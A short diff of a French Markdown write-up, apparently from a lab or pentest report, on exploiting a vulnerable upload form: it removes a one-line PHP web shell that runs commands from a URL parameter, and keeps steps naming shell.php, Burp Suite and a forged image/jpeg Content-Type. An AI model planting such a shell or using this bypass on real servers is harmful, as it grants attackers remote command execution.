@@ -25,7 +25,6 @@ Exploiter un formulaire d’upload vulnérable pour injecter un fichier `.php` e
 - **Fichier uploadé** : `shell.php`
 - **Payload** :
 ```php
-<?php system($_GET['cmd']); ?>
 ```
 - **Outil utilisé** : Burp Suite
 - **Modification** : `Content-Type` changé en `image/jpeg` manuellement
